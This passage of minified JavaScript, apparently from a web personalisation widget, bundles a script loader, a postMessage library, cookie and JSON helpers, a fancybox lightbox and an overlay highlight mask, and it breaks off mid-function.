function insIsLocalStorageSupported(){var insider='insider';try{localStorage.setItem(insider,insider);localStorage.removeItem(insider);return true;}catch(e){return false;}}
if(!insIsLocalStorageSupported()&&typeof console.log!=='undefined'){console.log('LocalStorage Support is not supported. API will not initialize.');}
else if(spApi===undefined){var spApi={};spApi.loadScript=function(url,callback){var script=document.createElement('script')
script.type='text/javascript';script.async='async';if(script.readyState){script.onreadystatechange=function(){if(script.readyState=='loaded'||script.readyState=='complete'){script.onreadystatechange=null;if('function'===typeof callback){callback();}}};}else{script.onload=function(){if('function'===typeof callback){callback();}};}
script.src=url;document.getElementsByTagName('head')[0].appendChild(script);};var sQuery;var protocol='';function insiderMain(){var NO_JQUERY={};(function(a,b,c){if(!("console"in a)){var d=a.console={};d.log=d.warn=d.error=d.debug=function(){}}if(b===NO_JQUERY){b={fn:{},extend:function(){var a=arguments[0];for(var b=1,c=arguments.length;b<c;b++){var d=arguments[b];for(var e in d){a[e]=d[e]}}return a}}}b.fn.pm=function(){return this};b.pm=a.pm=function(a){e.send(a)};b.pm.bind=a.pm.bind=function(a,b,c,d,f){e.bind(a,b,c,d,f===true)};b.pm.unbind=a.pm.unbind=function(a,b){e.unbind(a,b)};b.pm.origin=a.pm.origin=null;b.pm.poll=a.pm.poll=200;var e={send:function(a){var c=b.extend({},e.defaults,a),d=c.target;if(!c.target){return}if(!c.type){return}var f={data:c.data,type:c.type};if(c.success){f.callback=e._callback(c.success)}if(c.error){f.errback=e._callback(c.error)}if("postMessage"in d&&!c.hash){e._bind();d.postMessage(sQuery.toJSON(f),c.origin||"*")}else{e.hash._bind();e.hash.send(c,f)}},bind:function(a,b,c,d,f){e._replyBind(a,b,c,d,f)},_replyBind:function(c,d,f,g,h){if("postMessage"in a&&!g){e._bind()}else{e.hash._bind()}var i=e.data("listeners.postmessage");if(!i){i={};e.data("listeners.postmessage",i)}var j=i[c];if(!j){j=[];i[c]=j}j.push({fn:d,callback:h,origin:f||b.pm.origin})},unbind:function(a,b){var c=e.data("listeners.postmessage");if(c){if(a){if(b){var d=c[a];if(d){var f=[];for(var g=0,h=d.length;g<h;g++){var i=d[g];if(i.fn!==b){f.push(i)}}c[a]=f}}else{delete c[a]}}else{for(var g in c){delete c[g]}}}},data:function(a,b){if(b===c){return e._data[a]}e._data[a]=b;return b},_data:{},_CHARS:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".split(""),_random:function(){var a=[];for(var b=0;b<32;b++){a[b]=e._CHARS[0|Math.random()*32]}return a.join("")},_callback:function(a){var b=e.data("callbacks.postmessage");if(!b){b={};e.data("callbacks.postmessage",b)}var c=e._random();b[c]=a;return c},_bind:function(){if(!e.data("listening.postmessage")){if(a.addEventListener){a.addEventListener("message",e._dispatch,false)}else if(a.attachEvent){a.attachEvent("onmessage",e._dispatch)}e.data("listening.postmessage",1)}},_dispatch:function(a){try{var b=sQuery.evalJSON(a.data)}catch(c){return}if(!b.type){return}var d=e.data("callbacks.postmessage")||{},f=d[b.type];if(f){f(b.data)}else{var g=e.data("listeners.postmessage")||{};var h=g[b.type]||[];for(var i=0,j=h.length;i<j;i++){var k=h[i];if(k.origin&&k.origin!=="*"&&a.origin!==k.origin){if(b.errback){var l={message:"postmessage origin mismatch",origin:[a.origin,k.origin]};e.send({target:a.source,data:l,type:b.errback})}continue}function m(c){if(b.callback){e.send({target:a.source,data:c,type:b.callback})}}try{if(k.callback){k.fn(b.data,m,a)}else{m(k.fn(b.data,a))}}catch(c){if(b.errback){e.send({target:a.source,data:c,type:b.errback})}else{throw c}}}}}};e.hash={send:function(b,c){var d=b.target,f=b.url;if(!f){return}f=e.hash._url(f);var g,h=e.hash._url(a.location.href);if(a==d.parent){g="parent"}else{try{for(var i=0,j=parent.frames.length;i<j;i++){var k=parent.frames[i];if(k==a){g=i;break}}}catch(l){g=a.name}}if(g==null){return}var m={"x-requested-with":"postmessage",source:{name:g,url:h},postmessage:c};var n="#x-postmessage-id="+e._random();d.location=f+n+encodeURIComponent(sQuery.toJSON(m))},_regex:/^\#x\-postmessage\-id\=(\w{32})/,_regex_len:"#x-postmessage-id=".length+32,_bind:function(){if(!e.data("polling.postmessage")){setInterval(function(){var b=""+a.location.hash,c=e.hash._regex.exec(b);if(c){var d=c[1];if(e.hash._last!==d){e.hash._last=d;e.hash._dispatch(b.substring(e.hash._regex_len))}}},b.pm.poll||200);e.data("polling.postmessage",1)}},_dispatch:function(b){if(!b){return}try{b=sQuery.evalJSON(decodeURIComponent(b));if(!(b["x-requested-with"]==="postmessage"&&b.source&&b.source.name!=null&&b.source.url&&b.postmessage)){return}}catch(c){return}var d=b.postmessage,f=e.data("callbacks.postmessage")||{},g=f[d.type];if(g){g(d.data)}else{var h;if(b.source.name==="parent"){h=a.parent}else{h=a.frames[b.source.name]}var i=e.data("listeners.postmessage")||{};var j=i[d.type]||[];for(var k=0,l=j.length;k<l;k++){var m=j[k];if(m.origin){var n=/https?\:\/\/[^\/]*/.exec(b.source.url)[0];if(m.origin!=="*"&&n!==m.origin){if(d.errback){var o={message:"postmessage origin mismatch",origin:[n,m.origin]};e.send({target:h,data:o,type:d.errback,hash:true,url:b.source.url})}continue}}function p(a){if(d.callback){e.send({target:h,data:a,type:d.callback,hash:true,url:b.source.url})}}try{if(m.callback){m.fn(d.data,p)}else{p(m.fn(d.data))}}catch(c){if(d.errback){e.send({target:h,data:c,type:d.errback,hash:true,url:b.source.url})}else{throw c}}}}},_url:function(a){return(""+a).replace(/#.*$/,"")}};b.extend(e,{defaults:{target:null,url:null,type:null,data:null,success:null,error:null,origin:"*",hash:false}})})(this,typeof sQuery==="undefined"?NO_JQUERY:sQuery);(function(a){a.cookie=function(b,c,d){if(arguments.length>1&&(!/Object/.test(Object.prototype.toString.call(c))||c===null||c===undefined)){d=a.extend({},d);if(c===null||c===undefined){d.expires=-1}if(typeof d.expires==="number"){var e=d.expires,f=d.expires=new Date;f.setDate(f.getDate()+e)}c=String(c);return document.cookie=[encodeURIComponent(b),"=",d.raw?c:encodeURIComponent(c),d.expires?"; expires="+d.expires.toUTCString():"",d.path?"; path="+d.path:"",d.domain?"; domain="+d.domain:"",d.secure?"; secure":""].join("")}d=c||{};var g=d.raw?function(a){return a}:decodeURIComponent;var h=document.cookie.split("; ");for(var i=0,j;j="undefined"!==typeof h[i]&&h[i].split("=");i++){if(g(j[0])===b)return g(j[1]||"")}return null}})(sQuery);(function($){'use strict';var escape=/["\\\x00-\x1f\x7f-\x9f]/g,meta={'\b':'\\b','\t':'\\t','\n':'\\n','\f':'\\f','\r':'\\r','"':'\\"','\\':'\\\\'},hasOwn=Object.prototype.hasOwnProperty;$.toJSON=typeof JSON==='object'&&JSON.stringify?JSON.stringify:function(o){if(o===null){return'null';}var pairs,k,name,val,type=$.type(o);if(type==='undefined'){return undefined;}if(type==='number'||type==='boolean'){return String(o);}if(type==='string'){return $.quoteString(o);}if(typeof o.toJSON==='function'){return $.toJSON(o.toJSON());}if(type==='date'){var month=o.getUTCMonth()+1,day=o.getUTCDate(),year=o.getUTCFullYear(),hours=o.getUTCHours(),minutes=o.getUTCMinutes(),seconds=o.getUTCSeconds(),milli=o.getUTCMilliseconds();if(month<10){month='0'+month;}
if(day<10){day='0'+day;}if(hours<10){hours='0'+hours;}if(minutes<10){minutes='0'+minutes;}if(seconds<10){seconds='0'+seconds;}if(milli<100){milli='0'+milli;}if(milli<10){milli='0'+milli;}return'"'+year+'-'+month+'-'+day+'T'+
hours+':'+minutes+':'+seconds+'.'+milli+'Z"';}pairs=[];if($.isArray(o)){for(k=0;k<o.length;k++){pairs.push($.toJSON(o[k])||'null');}
return'['+pairs.join(',')+']';}if(typeof o==='object'){for(k in o){if(hasOwn.call(o,k)){type=typeof k;if(type==='number'){name='"'+k+'"';}else if(type==='string'){name=$.quoteString(k);}else{continue;}type=typeof o[k];if(type!=='function'&&type!=='undefined'){val=$.toJSON(o[k]);pairs.push(name+':'+val);}}}return'{'+pairs.join(',')+'}';}};$.evalJSON=typeof JSON==='object'&&JSON.parse?JSON.parse:function(str){return eval('('+str+')');};$.secureEvalJSON=typeof JSON==='object'&&JSON.parse?JSON.parse:function(str){var filtered=str.replace(/\\["\\\/bfnrtu]/g,'@').replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,']').replace(/(?:^|:|,)(?:\s*\[)+/g,'');if(/^[\],:{}\s]*$/.test(filtered)){return eval('('+str+')');}throw new SyntaxError('Error parsing JSON, source is not valid.');};$.quoteString=function(str){if(str.match(escape)){return'"'+str.replace(escape,function(a){var c=meta[a];if(typeof c==='string'){return c;}c=a.charCodeAt();return'\\u00'+Math.floor(c/16).toString(16)+(c%16).toString(16);})+'"';}return'"'+str+'"';};}(sQuery));(function(s,l,d,t){var m=d(s),q=d(l),a=d.fancybox=function(){a.open.apply(this,arguments)},u=!1,k=l.createTouch!==t,o=function(a){return"string"===d.type(a)},n=function(b,c){c&&o(b)&&0<b.indexOf("%")&&(b=a.getViewport()[c]/100*parseInt(b,10));return Math.round(b)+"px"};d.extend(a,{version:"2.0.5",defaults:{padding:15,margin:20,width:800,height:600,minWidth:100,minHeight:100,maxWidth:9999,maxHeight:9999,autoSize:!0,autoResize:!k,autoCenter:!k,fitToView:!0,aspectRatio:!1,topRatio:0.5,fixed:!1,scrolling:"auto",wrapCSS:"",arrows:!0,closeBtn:!0,closeClick:!1,nextClick:!1,mouseWheel:!0,autoPlay:!1,playSpeed:3E3,preload:3,modal:!1,loop:!0,ajax:{dataType:"html",headers:{"X-fancyBox":!0}},keys:{next:[13,32,34,39,40],prev:[8,33,37,38],close:[27]},tpl:{wrap:'<div class="sp-fancybox-wrap"><div class="sp-fancybox-skin"><div class="sp-fancybox-outer"><div class="sp-fancybox-inner"></div></div></div></div>',image:'<img class="fancybox-image" src="{href}" alt="" />',iframe:'<iframe class="sp-fancybox-iframe" name="fancybox-frame{rnd}" frameborder="0" hspace="0"'+
(d.browser.msie?' allowtransparency="true"':"")+"></iframe>",swf:'<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="100%" height="100%"><param name="wmode" value="transparent" /><param name="allowfullscreen" value="true" /><param name="allowscriptaccess" value="always" /><param name="movie" value="{href}" /><embed src="{href}" type="application/x-shockwave-flash" allowfullscreen="true" allowscriptaccess="always" width="100%" height="100%" wmode="transparent"></embed></object>',error:'<p class="sp-fancybox-error">The requested content cannot be loaded.<br/>Please try again later.</p>',closeBtn:'<div title="Close" class="sp-fancybox-item sp-fancybox-close"></div>',next:'<a title="Next" class="sp-fancybox-nav sp-fancybox-next"><span></span></a>',prev:'<a title="Previous" class="sp-fancybox-nav sp-fancybox-prev"><span></span></a>'},openEffect:"fade",openSpeed:300,openEasing:"swing",openOpacity:!0,openMethod:"zoomIn",closeEffect:"fade",closeSpeed:300,closeEasing:"swing",closeOpacity:!0,closeMethod:"zoomOut",nextEffect:"elastic",nextSpeed:300,nextEasing:"swing",nextMethod:"changeIn",prevEffect:"elastic",prevSpeed:300,prevEasing:"swing",prevMethod:"changeOut",helpers:{overlay:{speedIn:0,speedOut:300,opacity:0.8,css:{cursor:"pointer"},closeClick:!0},title:{type:"float"}}},group:{},opts:{},coming:null,current:null,isOpen:!1,isOpened:!1,player:{timer:null,isActive:!1},ajaxLoad:null,imgPreload:null,transitions:{},helpers:{},open:function(b,c){a.close(!0);b&&!d.isArray(b)&&(b=b instanceof d?d(b).get():[b]);a.isActive=!0;a.opts=d.extend(!0,{},a.defaults,c);d.isPlainObject(c)&&c.keys!==t&&(a.opts.keys=c.keys?d.extend({},a.defaults.keys,c.keys):!1);a.group=b;a._start(a.opts.index||0)},cancel:function(){a.coming&&!1===a.trigger("onCancel")||(a.coming=null,a.hideLoading(),a.ajaxLoad&&a.ajaxLoad.abort(),a.ajaxLoad=null,a.imgPreload&&(a.imgPreload.onload=a.imgPreload.onabort=a.imgPreload.onerror=null))},close:function(b){a.cancel();a.current&&!1!==a.trigger("beforeClose")&&(a.unbindEvents(),!a.isOpen||b&&!0===b[0]?(d(".sp-fancybox-wrap").stop().trigger("onReset").remove(),a._afterZoomOut()):(a.isOpen=a.isOpened=!1,d(".sp-fancybox-item, .sp-fancybox-nav").remove(),a.wrap.stop(!0).removeClass("sp-fancybox-opened"),a.inner.css("overflow","hidden"),a.transitions[a.current.closeMethod]()))},play:function(b){var c=function(){clearTimeout(a.player.timer)},e=function(){c();a.current&&a.player.isActive&&(a.player.timer=setTimeout(a.next,a.current.playSpeed))},f=function(){c();d("body").unbind(".player");a.player.isActive=!1;a.trigger("onPlayEnd")};if(a.player.isActive||b&&!1===b[0])f();else if(a.current&&(a.current.loop||a.current.index<a.group.length-1))a.player.isActive=!0,d("body").bind({"afterShow.player onUpdate.player":e,"onCancel.player beforeClose.player":f,"beforeLoad.player":c}),e(),a.trigger("onPlayStart")},next:function(){a.current&&a.jumpto(a.current.index+1)},prev:function(){a.current&&a.jumpto(a.current.index-1)},jumpto:function(b){a.current&&(b=parseInt(b,10),1<a.group.length&&a.current.loop&&(b>=a.group.length?b=0:0>b&&(b=a.group.length-1)),a.group[b]!==t&&(a.cancel(),a._start(b)))},reposition:function(b,c){var e;a.isOpen&&(e=a._getPosition(c),b&&"scroll"===b.type?(delete e.position,a.wrap.stop(!0,!0).animate(e,200)):a.wrap.css(e))},update:function(b){a.isOpen&&(u||setTimeout(function(){var c=a.current,e=!b||b&&"orientationchange"===b.type;if(u&&(u=!1,c)){if(!b||"scroll"!==b.type||e)c.autoSize&&"iframe"!==c.type&&(a.inner.height("auto"),c.height=a.inner.height()),(c.autoResize||e)&&a._setDimension(),c.canGrow&&"iframe"!==c.type&&a.inner.height("auto");(c.autoCenter||e)&&a.reposition(b);a.trigger("onUpdate")}},200),u=!0)},toggle:function(){a.isOpen&&(a.current.fitToView=!a.current.fitToView,a.update())},hideLoading:function(){q.unbind("keypress.fb");d("#sp-fancybox-loading").remove()},showLoading:function(){a.hideLoading();q.bind("keypress.fb",function(b){27===b.keyCode&&(b.preventDefault(),a.cancel())});d('<div id="sp-fancybox-loading"><div></div></div>').click(a.cancel).appendTo("body")},getViewport:function(){return{x:m.scrollLeft(),y:m.scrollTop(),w:k&&s.innerWidth?s.innerWidth:m.width(),h:k&&s.innerHeight?s.innerHeight:m.height()}},unbindEvents:function(){if(a.wrap!=null&&typeof a.wrap!="undefined"&&typeof a.wrap.unbind!="undefined"){a.wrap.unbind(".fb");}},bindEvents:function(){var b=a.current,c=b.keys;b&&(m.bind("resize.fb orientationchange.fb"+(b.autoCenter&&!b.fixed?" scroll.fb":""),a.update),c&&q.bind("keydown.fb",function(b){var f;f=b.target||b.srcElement;if(!b.ctrlKey&&!b.altKey&&!b.shiftKey&&!b.metaKey&&(!f||!f.type&&!d(f).is("[contenteditable]")))f=b.keyCode,-1<d.inArray(f,c.close)?(a.close(),b.preventDefault()):-1<d.inArray(f,c.next)?(a.next(),b.preventDefault()):-1<d.inArray(f,c.prev)&&(a.prev(),b.preventDefault())}),d.fn.mousewheel&&b.mouseWheel&&1<a.group.length&&a.wrap.bind("mousewheel.fb",function(b,c){var d=b.target||null;if(0!==c&&(!d||0===d.clientHeight||d.scrollHeight===d.clientHeight&&d.scrollWidth===d.clientWidth))b.preventDefault(),a[0<c?"prev":"next"]()}))},trigger:function(b,c){var e,f=c||a[-1<d.inArray(b,["onCancel","beforeLoad","afterLoad"])?"coming":"current"];if(f){d.isFunction(f[b])&&(e=f[b].apply(f,Array.prototype.slice.call(arguments,1)));if(!1===e)return!1;f.helpers&&d.each(f.helpers,function(c,e){if(e&&d.isPlainObject(a.helpers[c])&&d.isFunction(a.helpers[c][b]))a.helpers[c][b](e,f)});d.event.trigger(b+".fb")}},isImage:function(a){return o(a)&&a.match(/\.(jpe?g|gif|png|bmp)((\?|#).*)?$/i)},isSWF:function(a){return o(a)&&a.match(/\.(swf)((\?|#).*)?$/i)},_start:function(b){var c={},e=a.group[b]||null,f,g,i;if(e&&(e.nodeType||e instanceof d))f=!0,d.metadata&&(c=d(e).metadata());c=d.extend(!0,{},a.opts,{index:b,element:e},d.isPlainObject(e)?e:c);d.each(["href","title","content","type"],function(b,g){c[g]=a.opts[g]||f&&d(e).attr(g)||c[g]||null});"number"===typeof c.margin&&(c.margin=[c.margin,c.margin,c.margin,c.margin]);c.modal&&d.extend(!0,c,{closeBtn:!1,closeClick:!1,nextClick:!1,arrows:!1,mouseWheel:!1,keys:null,helpers:{overlay:{css:{cursor:"auto"},closeClick:!1}}});a.coming=c;if(!1===a.trigger("beforeLoad"))a.coming=null;else{g=c.type;b=c.href||e;g||(f&&(g=d(e).data("sp-fancybox-type"),g||(g=(g=e.className.match(/fancybox\.(\w+)/))?g[1]:null)),!g&&o(b)&&(a.isImage(b)?g="image":a.isSWF(b)?g="swf":b.match(/^#/)&&(g="inline")),g||(g=f?"inline":"html"),c.type=g);if("inline"===g||"html"===g){if(c.content||(c.content="inline"===g?d(o(b)?b.replace(/.*(?=#[^\s]+$)/,""):b):e),!c.content||!c.content.length)g=null}else b||(g=null);"ajax"===g&&o(b)&&(i=b.split(/\s+/,2),b=i.shift(),c.selector=i.shift());c.href=b;c.group=a.group;c.isDom=f;switch(g){case"image":a._loadImage();break;case"ajax":a._loadAjax();break;case"inline":case"iframe":case"swf":case"html":a._afterLoad();break;default:a._error("type")}}},_error:function(b){a.hideLoading();d.extend(a.coming,{type:"html",autoSize:!0,minWidth:0,minHeight:0,padding:15,hasError:b,content:a.coming.tpl.error});a._afterLoad()},_loadImage:function(){var b=a.imgPreload=new Image;b.onload=function(){this.onload=this.onerror=null;a.coming.width=this.width;a.coming.height=this.height;a._afterLoad()};b.onerror=function(){this.onload=this.onerror=null;a._error("image")};b.src=a.coming.href;(b.complete===t||!b.complete)&&a.showLoading()},_loadAjax:function(){a.showLoading();a.ajaxLoad=d.ajax(d.extend({},a.coming.ajax,{url:a.coming.href,error:function(b,c){a.coming&&"abort"!==c?a._error("ajax",b):a.hideLoading()},success:function(b,c){"success"===c&&(a.coming.content=b,a._afterLoad())}}))},_preloadImages:function(){var b=a.group,c=a.current,e=b.length,f,g,i,h=Math.min(c.preload,e-1);if(c.preload&&!(2>b.length))for(i=1;i<=h;i+=1)if(f=b[(c.index+i)%e],g=f.href||d(f).attr("href")||f,"image"===f.type||a.isImage(g))(new Image).src=g},_afterLoad:function(){a.hideLoading();!a.coming||!1===a.trigger("afterLoad",a.current)?a.coming=!1:(a.isOpened?(d(".sp-fancybox-item, .sp-fancybox-nav").remove(),a.wrap.stop(!0).removeClass("sp-fancybox-opened"),a.inner.css("overflow","hidden"),a.transitions[a.current.prevMethod]()):(d(".sp-fancybox-wrap").stop().trigger("onReset").remove(),a.trigger("afterClose")),a.unbindEvents(),a.isOpen=!1,a.current=a.coming,a.wrap=d(a.current.tpl.wrap).addClass("fancybox-"+(k?"mobile":"desktop")+" fancybox-type-"+a.current.type+" sp-fancybox-tmp "+a.current.wrapCSS).appendTo("body"),a.skin=d(".sp-fancybox-skin",a.wrap).css("padding",n(a.current.padding)),a.outer=d(".sp-fancybox-outer",a.wrap),a.inner=d(".sp-fancybox-inner",a.wrap),a._setContent())},_setContent:function(){var b=a.current,c=b.content,e=b.type,f=b.minWidth,g=b.minHeight,i=b.maxWidth,h=b.maxHeight;switch(e){case"inline":case"ajax":case"html":b.selector?c=d("<div>").html(c).find(b.selector):c instanceof d&&(c.parent().hasClass("sp-fancybox-inner")&&c.parents(".sp-fancybox-wrap").unbind("onReset"),c=c.show().detach(),d(a.wrap).bind("onReset",function(){c.appendTo("body").hide()}));b.autoSize&&(f=d('<div class="sp-fancybox-wrap '+a.current.wrapCSS+' fancybox-tmp"></div>').appendTo("body").css({minWidth:n(f,"w"),minHeight:n(g,"h"),maxWidth:n(i,"w"),maxHeight:n(h,"h")}).append(c),b.width=f.width(),b.height=f.height(),f.width(a.current.width),f.height()>b.height&&(f.width(b.width+1),b.width=f.width(),b.height=f.height()),c=f.contents().detach(),f.remove());break;case"image":c=b.tpl.image.replace("{href}",b.href);b.aspectRatio=!0;break;case"swf":c=b.tpl.swf.replace(/\{width\}/g,b.width).replace(/\{height\}/g,b.height).replace(/\{href\}/g,b.href);break;case"iframe":c=d(b.tpl.iframe.replace("{rnd}",(new Date).getTime())).attr("scrolling",b.scrolling).attr("src",b.href),b.scrolling=k?"scroll":"auto"}if("image"===e||"swf"===e)b.autoSize=!1,b.scrolling="visible";"iframe"===e&&b.autoSize?(a.showLoading(),a._setDimension(),a.inner.css("overflow",b.scrolling),c.bind({onCancel:function(){d(this).unbind();a._afterZoomOut()},load:function(){a.hideLoading();try{this.contentWindow.document.location&&(a.current.height=d(this).contents().find("body").height())}catch(b){a.current.autoSize=!1}a[a.isOpen?"_afterZoomIn":"_beforeShow"]()}}).appendTo(a.inner)):(a.inner.append(c),a._beforeShow())},_beforeShow:function(){a.coming=null;a.trigger("beforeShow");a._setDimension();a.wrap.hide().removeClass("sp-fancybox-tmp");a.bindEvents();a._preloadImages();a.transitions[a.isOpened?a.current.nextMethod:a.current.openMethod]()},_setDimension:function(){var b=a.wrap,c=a.inner,e=a.current,f=a.getViewport(),g=e.margin,i=2*e.padding,h=e.width,j=e.height,r=e.maxWidth+i,k=e.maxHeight+i,l=e.minWidth+i,m=e.minHeight+i,p;f.w-=g[1]+g[3];f.h-=g[0]+g[2];o(h)&&0<h.indexOf("%")&&(h=(f.w-i)*parseFloat(h)/100);o(j)&&0<j.indexOf("%")&&(j=(f.h-i)*parseFloat(j)/100);g=h/j;h+=i;j+=i;e.fitToView&&(r=Math.min(f.w,r),k=Math.min(f.h,k));if(e.aspectRatio){if(h>r&&(h=r,j=(h-i)/g+i),j>k&&(j=k,h=(j-i)*g+i),h<l&&(h=l,j=(h-i)/g+i),j<m)j=m,h=(j-i)*g+i}else h=Math.max(l,Math.min(h,r)),j=Math.max(m,Math.min(j,k));h=Math.round(h);j=Math.round(j);d(b.add(c)).width("auto").height("auto");c.width(h-i).height(j-i);b.width(h);p=b.height();if(h>r||p>k)for(;(h>r||p>k)&&h>l&&p>m;)j-=10,e.aspectRatio?(h=Math.round((j-i)*g+i),h<l&&(h=l,j=(h-i)/g+i)):h-=10,c.width(h-i).height(j-i),b.width(h),p=b.height();e.dim={width:n(h),height:n(p)};e.canGrow=e.autoSize&&j>m&&j<k;e.canShrink=!1;e.canExpand=!1;if(h-i<e.width||j-i<e.height)e.canExpand=!0;else if((h>f.w||p>f.h)&&h>l&&j>m)e.canShrink=!0;a.innerSpace=p-i-
c.height()},_getPosition:function(b){var c=a.current,e=a.getViewport(),f=c.margin,d=a.wrap.width()+f[1]+f[3],i=a.wrap.height()+f[0]+f[2],h={position:"absolute",top:f[0]+e.y,left:f[3]+e.x};c.autoCenter&&c.fixed&&!b&&i<=e.h&&d<=e.w&&(h={position:"fixed",top:f[0],left:f[3]});h.top=n(Math.max(h.top,h.top+(e.h-i)*c.topRatio));h.left=n(Math.max(h.left,h.left+0.5*(e.w-d)));return h},_afterZoomIn:function(){var b=a.current,c=b?b.scrolling:"no";if(b&&(a.isOpen=a.isOpened=!0,a.wrap.addClass("sp-fancybox-opened"),a.inner.css("overflow","yes"===c?"scroll":"no"===c?"hidden":c),a.trigger("afterShow"),a.update(),(b.closeClick||b.nextClick)&&a.inner.css("cursor","pointer").bind("click.fb",function(c){if(!d(c.target).is("a")&&!d(c.target).parent().is("a"))a[b.closeClick?"close":"next"]()}),b.closeBtn&&d(b.tpl.closeBtn).appendTo(a.skin).bind("click.fb",a.close),b.arrows&&1<a.group.length&&((b.loop||0<b.index)&&d(b.tpl.prev).appendTo(a.outer).bind("click.fb",a.prev),(b.loop||b.index<a.group.length-1)&&d(b.tpl.next).appendTo(a.outer).bind("click.fb",a.next)),a.opts.autoPlay&&!a.player.isActive))a.opts.autoPlay=!1,a.play()},_afterZoomOut:function(){var b=a.current;a.wrap.trigger("onReset").remove();d.extend(a,{group:{},opts:{},current:null,isActive:!1,isOpened:!1,isOpen:!1,wrap:null,skin:null,outer:null,inner:null});a.trigger("afterClose",b)}});a.transitions={getOrigPosition:function(){var b=a.current,c=b.element,e=b.padding,f=d(b.orig),g={},i=50,h=50;!f.length&&b.isDom&&d(c).is(":visible")&&(f=d(c).find("img:first"),f.length||(f=d(c)));f.length?(g=f.offset(),f.is("img")&&(i=f.outerWidth(),h=f.outerHeight())):(b=a.getViewport(),g.top=b.y+0.5*(b.h-h),g.left=b.x+0.5*(b.w-i));return g={top:n(g.top-e),left:n(g.left-e),width:n(i+2*e),height:n(h+2*e)}},step:function(b,c){var e=c.prop,d,g;if("width"===e||"height"===e)d=Math.ceil(b-2*a.current.padding),"height"===e&&(g=(b-c.start)/(c.end-c.start),c.start>c.end&&(g=1-g),d-=a.innerSpace*g),a.inner[e](d)},zoomIn:function(){var b=a.wrap,c=a.current,e=c.openEffect,f="elastic"===e,g=d.extend({},c.dim,a._getPosition(f)),i=d.extend({opacity:1},g);delete i.position;f?(g=this.getOrigPosition(),c.openOpacity&&(g.opacity=0),a.outer.add(a.inner).width("auto").height("auto")):"fade"===e&&(g.opacity=0);b.css(g).show().animate(i,{duration:"none"===e?0:c.openSpeed,easing:c.openEasing,step:f?this.step:null,complete:a._afterZoomIn})},zoomOut:function(){var b=a.wrap,c=a.current,d=c.openEffect,f="elastic"===d,g={opacity:0};f&&("fixed"===b.css("position")&&b.css(a._getPosition(!0)),g=this.getOrigPosition(),c.closeOpacity&&(g.opacity=0));b.animate(g,{duration:"none"===d?0:c.closeSpeed,easing:c.closeEasing,step:f?this.step:null,complete:a._afterZoomOut})},changeIn:function(){var b=a.wrap,c=a.current,d=c.nextEffect,f="elastic"===d,g=a._getPosition(f),i={opacity:1};g.opacity=0;f&&(g.top=n(parseInt(g.top,10)-200),i.top="+=200px");b.css(g).show().animate(i,{duration:"none"===d?0:c.nextSpeed,easing:c.nextEasing,complete:a._afterZoomIn})},changeOut:function(){var b=a.wrap,c=a.current,e=c.prevEffect,f={opacity:0};b.removeClass("sp-fancybox-opened");"elastic"===e&&(f.top="+=200px");b.animate(f,{duration:"none"===e?0:c.prevSpeed,easing:c.prevEasing,complete:function(){d(this).trigger("onReset").remove()}})}};a.helpers.overlay={overlay:null,update:function(){var a,c;this.overlay.width("100%").height("100%");d.browser.msie||k?(a=Math.max(l.documentElement.scrollWidth,l.body.scrollWidth),c=Math.max(l.documentElement.offsetWidth,l.body.offsetWidth),a=a<c?m.width():a):a=q.width();this.overlay.width(a).height(q.height())},beforeShow:function(b){this.overlay||(b=d.extend(!0,{},a.defaults.helpers.overlay,b),this.overlay=d('<div id="sp-fancybox-overlay"></div>').css(b.css).appendTo("body"),b.closeClick&&this.overlay.bind("click.fb",a.close),a.current.fixed&&!k?this.overlay.addClass("overlay-fixed"):(this.update(),this.onUpdate=function(){this.update()}),this.overlay.fadeTo(b.speedIn,b.opacity))},afterClose:function(a){this.overlay&&this.overlay.fadeOut(a.speedOut||0,function(){d(this).remove()});this.overlay=null}};a.helpers.title={beforeShow:function(b){var c;if(c=a.current.title)c=d('<div class="sp-fancybox-title sp-fancybox-title-'+b.type+'-wrap">'+c+"</div>").appendTo("body"),"float"===b.type&&(c.width(c.width()),c.wrapInner('<span class="child"></span>'),a.current.margin[2]+=Math.abs(parseInt(c.css("margin-bottom"),10))),c.appendTo("over"===b.type?a.inner:"outside"===b.type?a.wrap:a.skin)}};d.fn.fancybox=function(b){var c=d(this),e=this.selector||"",f,g=function(g){var h=this,j=f,k;!g.ctrlKey&&!g.altKey&&!g.shiftKey&&!g.metaKey&&!d(h).is(".sp-fancybox-wrap")&&(g.preventDefault(),g=b.groupAttr||"data-fancybox-group",k=d(h).attr(g),k||(g="rel",k=h[g]),k&&""!==k&&"nofollow"!==k&&(h=e.length?d(e):c,h=h.filter("["+g+'="'+k+'"]'),j=h.index(this)),b.index=j,a.open(h,b))},b=b||{};f=b.index||0;e?q.undelegate(e,"click.fb-start").delegate(e,"click.fb-start",g):c.unbind("click.fb-start").bind("click.fb-start",g);return this};d(l).ready(function(){a.defaults.fixed=d.support.fixedPosition||!(d.browser.msie&&6>=d.browser.version)&&!k})})(window,document,sQuery);(function($){var highlight;highlight=$.highlight={conf:{layerId:'spApiOverlayMask',layerClass:'sp-highlight-overlay',appendTarget:'body',highlightedElements:[],closeOnEsc:false,closeOnClick:true,paddingLeft:0,paddingTop:0,padding:0,loadSpeed:'fast',closeSpeed:'fast',scroll:false,scrollSpeed:500,scrollSize:30,prevBackgroundColor:'',nextBackgroundColor:'',zIndex:99999998,opacity:0.8,startOpacity:0,color:'#000',onLoad:null,onClose:null,onBeforeLoad:null,onBeforeClose:null}};function call(fn){if(fn){return fn.call($.mask);}}
var mask,loaded,config,elements;function show(x0,y0,x1,y1,c){var overlay=$('<div class="'+c.layerClass+'"></div>').css({position:'absolute',background:c.color,opacity:c.opacity,filter:'alpha(opacity='+Math.round(c.opacity*100)+')',top:parseInt(y0)+'px',left:parseInt(x0)+'px',width:(parseInt(x1)-parseInt(x0))+'px',height:(parseInt(y1)-parseInt(y0))+'px',zIndex:c.zIndex}).appendTo($(c.appendTarget));$(c.appendTarget).append(overlay);}
$.mask={load:function load(c,el){if(loaded){return this;}
c=c||c;config=c=$.extend($.extend({},highlight.conf),c);if(el&&el.length){if(c.highlightedElements.length){elements=sQuery(c.highlightedElements.join());}else{elements=el;}
if(call(c.onBeforeLoad)===false){return this;}
$.mask.init(c,elements);if(c.scroll===true){$("body, html").animate({scrollTop:$(el).offset().top-c.scrollSize},c.scrollSpeed);}
if(call(c.onLoad)===false){return this;}
loaded="full";}
